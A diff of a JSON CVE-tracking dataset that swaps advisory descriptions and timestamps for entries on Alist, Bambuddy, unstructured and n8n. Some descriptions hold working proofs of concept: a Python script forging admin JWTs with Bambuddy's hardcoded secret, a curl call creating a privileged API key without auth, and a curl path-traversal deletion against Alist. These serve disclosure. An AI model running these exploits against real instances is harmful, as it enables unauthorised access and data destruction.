+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.017
   },
   "CVE-2026-23897": {
@@ -11480,9 +11501,9 @@
         "created_at": "2026-02-04T20:21:59.000Z"
       }
     ],
-    "description": "### Summary\nThe application contains a Path Traversal vulnerability (CWE-22) in multiple file operation handlers. An authenticated attacker can bypass directory-level authorisation by injecting traversal sequences into filename components, enabling unauthorised file removal, movement and copying across user boundaries within the same storage mount.\n\n### Details\nThe application contains a Path Traversal vulnerability (CWE-22) in multiple file operation handlers ([server/handles/fsmanage.go](https://github.com/AlistGo/alist/blob/main/server/handles/fsmanage.go), [server/handles/fsbatch.go](https://github.com/AlistGo/alist/blob/main/server/handles/fsbatch.go), etc.). Filename components in `req.Names`, `renameObject.SrcName`, and `renameObject.NewName` are directly concatenated with validated directories using `stdpath.Join()` or `fmt.Sprintf()`. This allows \"..\" sequences to bypass path restrictions, enabling users to access other users' files within the same storage mount and perform unauthorized actions such as deletion, renaming, or copying of files.\n\n[FsRemove](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/server/handles/fsmanage.go#L253-L254):\n~~~go\nfunc FsRemove(c *gin.Context) {\n\t// ...\n\tfor _, name := range req.Names {\n\t\terr := fs.Remove(c, stdpath.Join(reqDir, name))\n~~~\n\n[FsCopy](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/server/handles/fsmanage.go#L165-L166):\n~~~go\nfunc FsCopy(c *gin.Context) {\n\t// ...\n\tfor i, name := range req.Names {\n\t\tt, err := fs.Copy(c, stdpath.Join(srcDir, name), dstDir, len(req.Names) > i+1)\n~~~\n\n[FsBatchRename](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/server/handles/fsbatch.go#L188-L189):\n~~~go\nfunc FsBatchRename(c *gin.Context) {\n    // ...\n    for _, renameObject := range req.RenameObjects {\n        filePath := fmt.Sprintf(\"%s/%s\", reqPath, renameObject.SrcName)  // Vulnerable concatenation \u2717\n        fs.Rename(c, filePath, renameObject.NewName)\n    }\n}\n~~~\n\n\n#### PoC\n1. Environment setup:\n- Storage mount '/shared' configured with multiple users.\n- Alice has base path '/shared/alice'.\n- Admin has base path '/shared/admin' with private files.\n- Both users operate within the same storage mount.\n\n2. Craft Malicious Request:\nAlice sends a POST request to _/api/fs/remove_ containing a filename with '../' in it.\n~~~bash\ncurl -X POST -H  \"Content-Type: application/json\" -d '{\"dir\":\"/\",\"names\":[\"../admin/private.txt\"]}' http://localhost:5244/api/fs/remove\n~~~\n\nAdmin's file is deleted without Alice having authorisation for Admin's directory.\n\n[Video](https://github.com/user-attachments/assets/5789fa36-c82c-4781-a5f7-145f54689ada)\n\n\n### Impact\nThis vulnerability enables privilege escalation within shared storage environments. An authenticated attacker with basic file operation permissions (remove/rename/copy/move) can bypass directory-level authorisation controls when multiple users exist within the same storage mount.\n\n#### Attack Requirements:\n1. Authenticated user account (not guest)\n2. Basic file operation permissions\n3. Multi-user environment within the same storage mount\n\n#### Consequences:\n1. Unauthorised data access: Read, copy, and exfiltrate files from other users' directories\n2. Data destruction: Delete or rename files belonging to other users\n3. Access control bypass: Circumvent directory isolation mechanisms\n4. Integrity violation: Modify or move files across user boundaries\n\n\n### Credit\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nIf there are questions regarding the vulnerability details, please feel free to reach out for further discussion at xlabai@tencent.com.",
+    "description": "Alist is a file list program that supports multiple storages, powered by Gin and Solidjs. Prior to version 3.57.0, the application contains path traversal vulnerability in multiple file operation handlers. An authenticated attacker can bypass directory-level authorisation by injecting traversal sequences into filename components, enabling unauthorised file removal, movement and copying across user boundaries within the same storage mount. This issue has been patched in version 3.57.0.",
     "repos": [],
-    "updated": "2026-02-04T21:56:57",
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.05
   },
   "CVE-2026-25505": {
@@ -11534,9 +11555,9 @@
         "created_at": "2026-02-04T20:20:52.000Z"
       }
     ],
-    "description": "Bambuddy is a self-hosted print archive and management system for Bambu Lab 3D printers. Prior to version 0.1.7, a hardcoded secret key used for signing JWTs is checked into source code and ManyAPI routes do not check authentication. This issue has been patched in version 0.1.7.",
+    "description": "### Summary\n1. A hardcoded secret key used for signing JWTs is checked into source code\n2. ManyAPI routes do not check authentication\n\n### Details\nI am using the publicly available docker image at `ghcr.io/maziggy/bambuddy`\n#### 1. Hardcoded JWT Secret Key\nhttps://github.com/maziggy/bambuddy/blob/a9bb8ed8239602bf08a9914f85a09eeb2bf13d15/backend/app/core/auth.py#L28\n\n<details>\n<summary>Copying the Authorization token from a request via browser networking tools into JWT.io confirms the token is signed with this key</summary>\n\n<img width=\"1591\" height=\"937\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fd6e805a-9380-438f-a412-623660fa3f5a\" />\n\n</details>\n\nAny attacker can:\n1. Forge valid JWT tokens for any user\n2. Bypass authentication entirely\n3. Gain full administrative access to any Bambuddy instance using the default key\n\n**Steps to Reproduce:**\n\n1. Run an instance of BamBuddy\n2. Create admin user\n3. Forge and use JWT:\n```python\nimport jwt\nimport requests\n\ntoken = jwt.encode({\"sub\": \"admin\", \"exp\": 9999999999}, \"bambuddy-secret-key-change-in-production\", algorithm=\"HS256\")\nresp = requests.get(\"http://10.0.0.4:8000/api/v1/system/info\", headers={\"Authorization\": f\"Bearer {token}\"})\n\nprint(resp.status_code) # 200\nprint(resp.text) # {\"app\":{\"version\":\"0.1.7b\",\"base_dir\":\"/app/data\",\"archive_dir\":\"/app/data/archive\"},\"database\": ...\n```\n\n#### 2. Most API Routes do not check Auth\nWhile investigating the JWT forgery, I noticed that requests without `Authorization` headers still returned information for many endpoints:\n```python\nresp = requests.get(\"http://10.0.0.4:8000/api/v1/system/info\", headers={}) # Empty headers\n\nprint(resp.status_code) # 200\nprint(resp.text) # {\"app\":{\"version\":\"0.1.7b\",\"base_dir\":\"/app/data\",\"archive_dir\":\"/app/data/archive\"},\"database\": ...\n```\n\n#### Full Script and Output\n\nNote: I do not have smart plugs or spoolman set up to verify actual behavior with those endpoints so they are excluded from this script.\n\n<details>\n<summary>Script to test GET endpoints with forged JWT and without any auth</summary>\n\n```python3\n#!/usr/bin/env python3\n\"\"\"\nProof of Concept: JWT Forgery via Hardcoded Secret Key (VULN-001)\nFor security research purposes only.\n\nTests all GET endpoints to identify which are accessible without authentication.\n\"\"\"\n\nimport requests\nimport jwt\n\n# Hardcoded secret from backend/app/core/auth.py:28\nHARDCODED_SECRET = \"bambuddy-secret-key-change-in-production\"\nTARGET = \"http://10.0.0.4:8000\"\nAPI_PREFIX = \"/api/v1\"\n\n# All GET endpoints organized by router\nENDPOINTS = {\n    \"system\": [\n        \"/system/info\",\n    ],\n    \"auth\": [\n        \"/auth/status\",\n        \"/auth/me\",\n    ],\n    \"users\": [\n        \"/users\",\n        \"/users/1\",\n        \"/users/1/items-count\",\n    ],\n    \"groups\": [\n        \"/groups\",\n        \"/groups/permissions\",\n        \"/groups/1\",\n    ],\n    \"settings\": [\n        \"/settings\",\n        \"/settings/check-ffmpeg\",\n        \"/settings/spoolman\",\n        \"/settings/backup\",\n        \"/settings/virtual-printer/models\",\n        \"/settings/virtual-printer\",\n        \"/settings/mqtt/status\",\n    ],\n    \"printers\": [\n        \"/printers/\",\n        \"/printers/usb-cameras\",\n        \"/printers/1\",\n        \"/printers/1/status\",\n        \"/printers/1/current-print-user\",\n        \"/printers/1/cover\",\n        \"/printers/1/files\",\n        \"/printers/1/storage\",\n        \"/printers/1/logging\",\n        \"/printers/1/slot-presets\",\n        \"/printers/1/slot-presets/1/1\",\n        \"/printers/1/print/objects\",\n        \"/printers/1/runtime-debug\",\n        \"/printers/1/camera/status\",\n        \"/printers/1/camera/test\",\n        \"/printers/1/camera/plate-detection/status\",\n        \"/printers/1/camera/plate-detection/references\",\n        \"/printers/1/kprofiles/\",\n        \"/printers/1/kprofiles/notes\",\n    ],\n    \"archives\": [\n        \"/archives/\",\n        \"/archives/search\",\n        \"/archives/compare\",\n        \"/archives/analysis/failures\",\n        \"/archives/stats\",\n        \"/archives/tags\",\n        \"/archives/1\",\n        \"/archives/1/similar\",\n        \"/archives/1/duplicates\",\n        \"/archives/1/capabilities\",\n        \"/archives/1/gcode\",\n        \"/archives/1/plates\",\n        \"/archives/1/filament-requirements\",\n        \"/archives/1/project-page\",\n        \"/archives/1/source\",\n    ],\n    \"filaments\": [\n        \"/filaments/\",\n        \"/filaments/1\",\n        \"/filaments/by-type/pla\",\n    ],\n    \"cloud\": [\n        \"/cloud/status\",\n        \"/cloud/settings\",\n        \"/cloud/settings/1\",\n        \"/cloud/devices\",\n        \"/cloud/firmware-updates\",\n        \"/cloud/fields\",\n        \"/cloud/fields/print\",\n    ],\n    \"queue\": [\n        \"/queue/\",\n        \"/queue/1\",\n    ],\n    \"notifications\": [\n        \"/notifications/\",\n        \"/notifications/logs\",\n        \"/notifications/logs/stats\",\n        \"/notifications/1\",\n    ],\n    \"notification_templates\": [\n        \"/notification-templates\",\n        \"/notification-templates/variables\",\n        \"/notification-templates/1\",\n    ],\n    \"updates\": [\n        \"/updates/version\",\n        \"/updates/check\",\n        \"/updates/status\",\n    ],\n    \"maintenance\": [\n        \"/maintenance/types\",\n        \"/maintenance/overview\",\n        \"/maintenance/summary\",\n        \"/maintenance/printers/1\",\n        \"/maintenance/items/1/history\",\n    ],\n    \"external_links\": [\n        \"/external-links/\",\n        \"/external-links/1\",\n    ],\n    \"projects\": [\n        \"/projects\",\n        \"/projects/templates\",\n        \"/projects/1\",\n        \"/projects/1/archives\",\n        \"/projects/1/queue\",\n        \"/projects/1/bom\",\n        \"/projects/1/timeline\",\n    ],\n    \"library\": [\n        \"/library/folders\",\n        \"/library/folders/by-archive/1\",\n        \"/library/folders/by-project/1\",\n        \"/library/files\",\n        \"/library/stats\",\n        \"/library/folders/1\",\n        \"/library/files/1\",\n        \"/library/files/1/plates\",\n        \"/library/files/1/gcode\",\n        \"/library/files/1/filament-requirements\",\n    ],\n    \"api_keys\": [\n        \"/api-keys/\",\n        \"/api-keys/1\",\n    ],\n    \"webhook\": [\n        \"/webhook/printer/1/status\",\n        \"/webhook/queue\",\n    ],\n    \"ams_history\": [\n        \"/ams-history/1/1\",\n    ],\n    \"support\": [\n        \"/support/debug-logging\",\n        \"/support/logs\",\n    ],\n    \"discovery\": [\n        \"/discovery/info\",\n        \"/discovery/status\",\n        \"/discovery/printers\",\n        \"/discovery/scan/status\",\n    ],\n    \"pending_uploads\": [\n        \"/pending-uploads/\",\n        \"/pending-uploads/count\",\n        \"/pending-uploads/1\",\n    ],\n    \"firmware\": [\n        \"/firmware/updates\",\n        \"/firmware/updates/1\",\n        \"/firmware/latest\",\n    ],\n    \"github_backup\": [\n        \"/github-backup/config\",\n        \"/github-backup/status\",\n        \"/github-backup/logs\",\n    ],\n    \"metrics\": [\n        \"/metrics\",\n    ],\n}\n\n\ndef forge_token():\n    \"\"\"Forge a valid JWT token using the hardcoded secret.\"\"\"\n    payload = {\"sub\": \"admin\", \"exp\": 9999999999}\n    return jwt.encode(payload, HARDCODED_SECRET, algorithm=\"HS256\")\n\n\ndef test_endpoint(endpoint, headers):\n    \"\"\"Test a single endpoint and return status.\"\"\"\n    try:\n        resp = requests.get(f\"{TARGET}{API_PREFIX}{endpoint}\", headers=headers, timeout=5)\n        return resp.status_code, resp.text[:100] if resp.status_code == 200 else None\n    except requests.RequestException as e:\n        return \"ERROR\", str(e)[:50]\n\n\ndef main():\n    token = forge_token()\n    print(f\"[*] Forged JWT token:\\n    {token}\\n\")\n\n    # Test with no auth, then with forged JWT\n    test_modes = [\n        (\"NO AUTH\", {}),\n        (\"FORGED JWT\", {\"Authorization\": f\"Bearer {token}\"}),\n    ]\n\n    results = {\"no_auth\": [], \"jwt_only\": [], \"both_fail\": []}\n\n    print(f\"[*] Testing {sum(len(v) for v in ENDPOINTS.values())} endpoints against {TARGET}\\n\")\n    print(\"=\" * 70)\n\n    for category, endpoints in ENDPOINTS.items():\n        print(f\"\\n[{category.upper()}]\")\n\n        for endpoint in endpoints:\n            no_auth_status, _ = test_endpoint(endpoint, {})\n            jwt_status, preview = test_endpoint(endpoint, {\"Authorization\": f\"Bearer {token}\"})\n\n            if no_auth_status == 200:\n                results[\"no_auth\"].append(endpoint)\n                print(f\"  {endpoint}: NO AUTH REQUIRED\")\n            elif jwt_status == 200:\n                results[\"jwt_only\"].append(endpoint)\n                print(f\"  {endpoint}: JWT WORKS\")\n            else:\n                results[\"both_fail\"].append((endpoint, no_auth_status, jwt_status))\n                print(f\"  {endpoint}: {no_auth_status} / {jwt_status}\")\n\n    # Summary\n    print(\"\\n\" + \"=\" * 70)\n    print(\"\\n[SUMMARY]\\n\")\n\n    print(f\"Endpoints accessible WITHOUT authentication ({len(results['no_auth'])}):\")\n    for ep in results[\"no_auth\"]:\n        print(f\"  - {ep}\")\n\n    print(f\"\\nEndpoints accessible with FORGED JWT only ({len(results['jwt_only'])}):\")\n    for ep in results[\"jwt_only\"]:\n        print(f\"  - {ep}\")\n\n    print(f\"\\nEndpoints that rejected both ({len(results['both_fail'])}):\")\n    for ep, no_auth, jwt_auth in results[\"both_fail\"]:\n        print(f\"  - {ep} (no_auth: {no_auth}, jwt: {jwt_auth})\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n</details>\n\n<details>\n<summary>Script output</summary>\n\n```\n[*] Forged JWT token:\n    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzcGVlbmFoIiwiZXhwIjo5OTk5OTk5OTk5fQ.xeUmpf4PkhI7jHHGBPLWQEQQ4GTiiUOENeQkPpvNMnA\n\n[*] Testing 117 endpoints against http://10.0.0.4:8000\n\n======================================================================\n\n[SYSTEM]\n  /system/info: NO AUTH REQUIRED\n\n[AUTH]\n  /auth/status: NO AUTH REQUIRED\n  /auth/me: JWT WORKS\n\n[USERS]\n  /users: JWT WORKS\n  /users/1: JWT WORKS\n  /users/1/items-count: JWT WORKS\n\n[GROUPS]\n  /groups: JWT WORKS\n  /groups/permissions: JWT WORKS\n  /groups/1: JWT WORKS\n\n[SETTINGS]\n  /settings: NO AUTH REQUIRED\n  /settings/check-ffmpeg: NO AUTH REQUIRED\n  /settings/spoolman: NO AUTH REQUIRED\n  /settings/backup: NO AUTH REQUIRED\n  /settings/virtual-printer/models: NO AUTH REQUIRED\n  /settings/virtual-printer: NO AUTH REQUIRED\n  /settings/mqtt/status: NO AUTH REQUIRED\n\n[PRINTERS]\n  /printers/: JWT WORKS\n  /printers/usb-cameras: JWT WORKS\n  /printers/1: JWT WORKS\n  /printers/1/status: JWT WORKS\n  /printers/1/current-print-user: JWT WORKS\n  /printers/1/cover: JWT WORKS\n  /printers/1/files: JWT WORKS\n  /printers/1/storage: JWT WORKS\n  /printers/1/logging: JWT WORKS\n  /printers/1/slot-presets: JWT WORKS\n  /printers/1/slot-presets/1/1: JWT WORKS\n  /printers/1/print/objects: JWT WORKS\n  /printers/1/runtime-debug: JWT WORKS\n  /printers/1/camera/status: NO AUTH REQUIRED\n  /printers/1/camera/test: ERROR / ERROR\n  /printers/1/camera/plate-detection/status: NO AUTH REQUIRED\n  /printers/1/camera/plate-detection/references: NO AUTH REQUIRED\n  /printers/1/kprofiles/: ERROR / ERROR\n  /printers/1/kprofiles/notes: NO AUTH REQUIRED\n\n[ARCHIVES]\n  /archives/: NO AUTH REQUIRED\n  /archives/search: 422 / 422\n  /archives/compare: 422 / 422\n  /archives/analysis/failures: NO AUTH REQUIRED\n  /archives/stats: NO AUTH REQUIRED\n  /archives/tags: NO AUTH REQUIRED\n  /archives/1: NO AUTH REQUIRED\n  /archives/1/similar: NO AUTH REQUIRED\n  /archives/1/duplicates: NO AUTH REQUIRED\n  /archives/1/capabilities: NO AUTH REQUIRED\n  /archives/1/gcode: NO AUTH REQUIRED\n  /archives/1/plates: NO AUTH REQUIRED\n  /archives/1/filament-requirements: NO AUTH REQUIRED\n  /archives/1/project-page: NO AUTH REQUIRED\n  /archives/1/source: 404 / 404\n\n[FILAMENTS]\n  /filaments/: NO AUTH REQUIRED\n  /filaments/1: NO AUTH REQUIRED\n  /filaments/by-type/pla: NO AUTH REQUIRED\n\n[CLOUD]\n  /cloud/status: NO AUTH REQUIRED\n  /cloud/settings: 401 / 401\n  /cloud/settings/1: 401 / 401\n  /cloud/devices: 401 / 401\n  /cloud/firmware-updates: 401 / 401\n  /cloud/fields: NO AUTH REQUIRED\n  /cloud/fields/print: NO AUTH REQUIRED\n\n[QUEUE]\n  /queue/: NO AUTH REQUIRED\n  /queue/1: 404 / 404\n\n[NOTIFICATIONS]\n  /notifications/: NO AUTH REQUIRED\n  /notifications/logs: NO AUTH REQUIRED\n  /notifications/logs/stats: NO AUTH REQUIRED\n  /notifications/1: 404 / 404\n\n[NOTIFICATION_TEMPLATES]\n  /notification-templates: NO AUTH REQUIRED\n  /notification-templates/variables: NO AUTH REQUIRED\n  /notification-templates/1: NO AUTH REQUIRED\n\n[UPDATES]\n  /updates/version: NO AUTH REQUIRED\n  /updates/check: NO AUTH REQUIRED\n  /updates/status: NO AUTH REQUIRED\n\n[MAINTENANCE]\n  /maintenance/types: NO AUTH REQUIRED\n  /maintenance/overview: NO AUTH REQUIRED\n  /maintenance/summary: NO AUTH REQUIRED\n  /maintenance/printers/1: NO AUTH REQUIRED\n  /maintenance/items/1/history: NO AUTH REQUIRED\n\n[EXTERNAL_LINKS]\n  /external-links/: NO AUTH REQUIRED\n  /external-links/1: 404 / 404\n\n[PROJECTS]\n  /projects: NO AUTH REQUIRED\n  /projects/templates: NO AUTH REQUIRED\n  /projects/1: NO AUTH REQUIRED\n  /projects/1/archives: NO AUTH REQUIRED\n  /projects/1/queue: NO AUTH REQUIRED\n  /projects/1/bom: NO AUTH REQUIRED\n  /projects/1/timeline: NO AUTH REQUIRED\n\n[LIBRARY]\n  /library/folders: NO AUTH REQUIRED\n  /library/folders/by-archive/1: NO AUTH REQUIRED\n  /library/folders/by-project/1: NO AUTH REQUIRED\n  /library/files: NO AUTH REQUIRED\n  /library/stats: NO AUTH REQUIRED\n  /library/folders/1: NO AUTH REQUIRED\n  /library/files/1: 404 / 404\n  /library/files/1/plates: 404 / 404\n  /library/files/1/gcode: 404 / 404\n  /library/files/1/filament-requirements: 404 / 404\n\n[API_KEYS]\n  /api-keys/: NO AUTH REQUIRED\n  /api-keys/1: NO AUTH REQUIRED\n\n[WEBHOOK]\n  /webhook/printer/1/status: 401 / 401\n  /webhook/queue: 401 / 401\n\n[AMS_HISTORY]\n  /ams-history/1/1: NO AUTH REQUIRED\n\n[SUPPORT]\n  /support/debug-logging: NO AUTH REQUIRED\n  /support/logs: NO AUTH REQUIRED\n\n[DISCOVERY]\n  /discovery/info: NO AUTH REQUIRED\n  /discovery/status: NO AUTH REQUIRED\n  /discovery/printers: NO AUTH REQUIRED\n  /discovery/scan/status: NO AUTH REQUIRED\n\n[PENDING_UPLOADS]\n  /pending-uploads/: NO AUTH REQUIRED\n  /pending-uploads/count: NO AUTH REQUIRED\n  /pending-uploads/1: 404 / 404\n\n[FIRMWARE]\n  /firmware/updates: NO AUTH REQUIRED\n  /firmware/updates/1: NO AUTH REQUIRED\n  /firmware/latest: NO AUTH REQUIRED\n\n[GITHUB_BACKUP]\n  /github-backup/config: NO AUTH REQUIRED\n  /github-backup/status: NO AUTH REQUIRED\n  /github-backup/logs: NO AUTH REQUIRED\n\n[METRICS]\n  /metrics: 401 / 401\n\n======================================================================\n\n[SUMMARY]\n\nEndpoints accessible WITHOUT authentication (77):\n  - /system/info\n  - /auth/status\n  - /settings\n  - /settings/check-ffmpeg\n  - /settings/spoolman\n  - /settings/backup\n  - /settings/virtual-printer/models\n  - /settings/virtual-printer\n  - /settings/mqtt/status\n  - /printers/1/camera/status\n  - /printers/1/camera/plate-detection/status\n  - /printers/1/camera/plate-detection/references\n  - /printers/1/kprofiles/notes\n  - /archives/\n  - /archives/analysis/failures\n  - /archives/stats\n  - /archives/tags\n  - /archives/1\n  - /archives/1/similar\n  - /archives/1/duplicates\n  - /archives/1/capabilities\n  - /archives/1/gcode\n  - /archives/1/plates\n  - /archives/1/filament-requirements\n  - /archives/1/project-page\n  - /filaments/\n  - /filaments/1\n  - /filaments/by-type/pla\n  - /cloud/status\n  - /cloud/fields\n  - /cloud/fields/print\n  - /queue/\n  - /notifications/\n  - /notifications/logs\n  - /notifications/logs/stats\n  - /notification-templates\n  - /notification-templates/variables\n  - /notification-templates/1\n  - /updates/version\n  - /updates/check\n  - /updates/status\n  - /maintenance/types\n  - /maintenance/overview\n  - /maintenance/summary\n  - /maintenance/printers/1\n  - /maintenance/items/1/history\n  - /external-links/\n  - /projects\n  - /projects/templates\n  - /projects/1\n  - /projects/1/archives\n  - /projects/1/queue\n  - /projects/1/bom\n  - /projects/1/timeline\n  - /library/folders\n  - /library/folders/by-archive/1\n  - /library/folders/by-project/1\n  - /library/files\n  - /library/stats\n  - /library/folders/1\n  - /api-keys/\n  - /api-keys/1\n  - /ams-history/1/1\n  - /support/debug-logging\n  - /support/logs\n  - /discovery/info\n  - /discovery/status\n  - /discovery/printers\n  - /discovery/scan/status\n  - /pending-uploads/\n  - /pending-uploads/count\n  - /firmware/updates\n  - /firmware/updates/1\n  - /firmware/latest\n  - /github-backup/config\n  - /github-backup/status\n  - /github-backup/logs\n\nEndpoints accessible with FORGED JWT only (20):\n  - /auth/me\n  - /users\n  - /users/1\n  - /users/1/items-count\n  - /groups\n  - /groups/permissions\n  - /groups/1\n  - /printers/\n  - /printers/usb-cameras\n  - /printers/1\n  - /printers/1/status\n  - /printers/1/current-print-user\n  - /printers/1/cover\n  - /printers/1/files\n  - /printers/1/storage\n  - /printers/1/logging\n  - /printers/1/slot-presets\n  - /printers/1/slot-presets/1/1\n  - /printers/1/print/objects\n  - /printers/1/runtime-debug\n\nEndpoints that rejected both (20):\n  - /printers/1/camera/test (no_auth: ERROR, jwt: ERROR)\n  - /printers/1/kprofiles/ (no_auth: ERROR, jwt: ERROR)\n  - /archives/search (no_auth: 422, jwt: 422)\n  - /archives/compare (no_auth: 422, jwt: 422)\n  - /archives/1/source (no_auth: 404, jwt: 404)\n  - /cloud/settings (no_auth: 401, jwt: 401)\n  - /cloud/settings/1 (no_auth: 401, jwt: 401)\n  - /cloud/devices (no_auth: 401, jwt: 401)\n  - /cloud/firmware-updates (no_auth: 401, jwt: 401)\n  - /queue/1 (no_auth: 404, jwt: 404)\n  - /notifications/1 (no_auth: 404, jwt: 404)\n  - /external-links/1 (no_auth: 404, jwt: 404)\n  - /library/files/1 (no_auth: 404, jwt: 404)\n  - /library/files/1/plates (no_auth: 404, jwt: 404)\n  - /library/files/1/gcode (no_auth: 404, jwt: 404)\n  - /library/files/1/filament-requirements (no_auth: 404, jwt: 404)\n  - /webhook/printer/1/status (no_auth: 401, jwt: 401)\n  - /webhook/queue (no_auth: 401, jwt: 401)\n  - /pending-uploads/1 (no_auth: 404, jwt: 404)\n  - /metrics (no_auth: 401, jwt: 401)\n```\n\n</details>\n\nWhile this script only tests the GET endpoints, these vulnerabilities are not exclusive to GET endpoints. The GET endpoints were easiest to script since they generally don't require many parameters, but other methods still appear vulnerable. I manually tested `POST /api/v1/api-keys/` and was able to create a new API key with all permissions without auth:\n```bash\ncurl 'http://10.0.0.4:8000/api/v1/api-keys/' -X POST -H 'Content-Type: application/json' --data-raw '{\"name\":\"new key\",\"can_queue\":true,\"can_control_printer\":true,\"can_read_status\":true}'\n```\nyields\n```json\n{\"id\":7,\"name\":\"new key\",\"key_prefix\":\"bb_QW2su...\",\"can_queue\":true,\"can_control_printer\":true,\"can_read_status\":true,\"printer_ids\":null,\"enabled\":true,\"last_used\":null,\"created_at\":\"2026-02-01T23:14:15\",\"expires_at\":null,\"key\":\"bb_QW2suZVIHiUbadSyyAMrnmf0zFhDG5e9BSVBvb4ZN-w\"}\n```\n\n### Impact\nBamBuddy is vulnerable to unauthorized access and control",
     "repos": [],
-    "updated": "2026-02-06T19:16:09.483000",
+    "updated": "2026-02-06T21:38:04",
     "epss": 0.091
   },
   "CVE-2026-25121": {
@@ -11752,7 +11773,7 @@
     ],
     "description": "Articentgroup Zip Rar Extractor Tool 1.345.93.0 is vulnerable to Directory Traversal. The vulnerability resides in the ZIP file processing component, specifically in the functionality responsible for extracting and handling ZIP archive contents.",
     "repos": [],
-    "updated": "2026-02-04T18:30:31",
+    "updated": "2026-02-04T17:16:09.027000",
     "epss": 0.29
   },
   "CVE-2025-67187": {
@@ -11860,7 +11881,7 @@
     ],
     "description": "TOTOLINK A950RG V4.1.2cu.5204_B20210112 contains a buffer overflow vulnerability in the setUrlFilterRules interface of /lib/cste_modules/firewall.so. The vulnerability occurs because the `url` parameter is not properly validated for length, allowing remote attackers to trigger a buffer overflow, potentially leading to arbitrary code execution or denial of service.",
     "repos": [],
-    "updated": "2026-02-04T18:31:36",
+    "updated": "2026-02-04T17:16:10.007000",
     "epss": 0.152
   },
   "CVE-2026-1632": {
@@ -11968,7 +11989,7 @@
     ],
     "description": "MOMA Seismic Station Version v2.4.2520 and prior exposes its web management interface without requiring authentication, which could allow an unauthenticated attacker to modify configuration settings, acquire device data or remotely reset the device.",
     "repos": [],
-    "updated": "2026-02-04T16:33:44.537000",
+    "updated": "2026-02-04T00:30:41",
     "epss": 0.133
   },
   "CVE-2025-64712": {
@@ -12020,9 +12041,9 @@
         "created_at": "2026-02-04T18:27:38.000Z"
       }
     ],
-    "description": "A Path Traversal vulnerability in the `partition_msg` function allows an attacker to write or overwrite arbitrary files on the filesystem when processing malicious MSG files with attachments.\n\n  ## Impact\n  An attacker can craft a malicious .msg file with attachment filenames containing path traversal sequences (e.g.,\n  `../../../etc/cron.d/malicious`). When processed with `process_attachments=True`, the library writes the attachment to an\n  attacker-controlled path, potentially leading to:\n\n  - Arbitrary file overwrite\n  - Remote code execution (via overwriting configuration files, cron jobs, or Python packages)\n  - Data corruption\n  - Denial of service\n\n  ## Affected Functionality\n  The vulnerability affects the MSG file partitioning functionality when `process_attachments=True` is enabled.\n\n  ## Vulnerability Details\n  The library does not sanitize attachment filenames in MSG files before using them in file write operations, allowing directory\n  traversal sequences to escape the intended output directory.\n\n  ## Workarounds\n  Until patched, users can:\n  - Set `process_attachments=False` when processing untrusted MSG files\n  - Avoid processing MSG files from untrusted sources\n  - Implement additional filename validation before processing",
+    "description": "The unstructured library provides open-source components for ingesting and pre-processing images and text documents, such as PDFs, HTML, Word docs, and many more. Prior to version 0.18.18, a path traversal vulnerability in the partition_msg function allows an attacker to write or overwrite arbitrary files on the filesystem when processing malicious MSG files with attachments. This issue has been patched in version 0.18.18.",
     "repos": [],
-    "updated": "2026-02-04T19:53:06",
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.063
   },
   "CVE-2025-61917": {
@@ -12074,9 +12095,9 @@
         "created_at": "2026-02-04T18:15:20.000Z"
       }
     ],
-    "description": "n8n is an open source workflow automation platform. From version 1.65.0 to before 1.114.3, the use of Buffer.allocUnsafe() and Buffer.allocUnsafeSlow() in the task runner allowed untrusted code to allocate uninitialized memory. Such uninitialized buffers could contain residual data from within the same Node.js process (for example, data from prior requests, tasks, secrets, or tokens), resulting in potential information disclosure. This issue has been patched in version 1.114.3.",
+    "description": "### Impact\n\nThe use of `Buffer.allocUnsafe()` and `Buffer.allocUnsafeSlow()` in the task runner allowed untrusted code to allocate uninitialized memory. Such uninitialized buffers could contain residual data from within the same Node.js process (for example, data from prior requests, tasks, secrets, or tokens), resulting in potential information disclosure.  \n\nOnly authenticated users are able to execute code through Task Runners.\n\nThis issue affected any deployment in which both of the following conditions were met:\n- Task Runners were enabled using `N8N_RUNNERS_ENABLED=true` (default: false)\n- Code Node was enabled (default: true)\n\n\n### Patches\n\nAccess to unsafe Buffer functions has been removed from the task runner sandbox. All buffer allocations are now zero-filled by default.\n\n- **Fixed in:** 1.114.3 & 1.115.0\n- **Action:** It is strongly recommended to upgrade to version \u2265 1.114.3 as soon as possible.\n\nChanges introduced in this patch include:\n- Routing all buffer allocations through `Buffer.alloc` (which zero-fills) operations where applicable  \n- Adding regression tests to ensure continued enforcement of safe allocation practices\n\n\n### Workarounds\n\nIf an immediate upgrade cannot be applied, the following hardening steps are recommended:\n\n- Disable the Code Node by adding `n8n-nodes-base.code` to the `NODES_EXCLUDE` environment variable  \n- Prefer external mode for isolation: run Task Runners in external mode so that untrusted task code executes in a separate sidecar container rather than within the main n8n process. This configuration significantly reduces the risk of in-process memory disclosure caused by unsafe buffer allocations.  \n  In external mode, a launcher manages Task Runner processes in a dedicated sidecar environment, separate from the primary n8n instance.  \n  See the [n8n documentation](https://docs.n8n.io/hosting/configuration/task-runners/) for configuration details and required environment variables.\n\n\n### Resources\n\n- Node.js documentation: [`Buffer.alloc()`](https://nodejs.org/docs/latest-v22.x/api/buffer.html#static-method-bufferallocsize-fill-encoding) vs [`Buffer.allocUnsafe()`](https://nodejs.org/docs/latest-v22.x/api/buffer.html#static-method-bufferallocunsafesize) \u2014 background on zero-filled vs uninitialized allocations  \n- [n8n Documentation \u2014 Task Runners](https://docs.n8n.io/hosting/configuration/task-runners/) \u2014 external mode, setup guide, and environment configuration details\n- [n8n Documentation \u2014 Blocking nodes](https://docs.n8n.io/hosting/securing/blocking-nodes/) \u2014 how to globally disable specific nodes",
     "repos": [],
-    "updated": "2026-02-05T14:57:34.297000",
+    "updated": "2026-02-04T19:53:01",
     "epss": 0.011000000000000001
   },
   "CVE-2026-0661": {
@@ -12130,7 +12151,7 @@
     ],
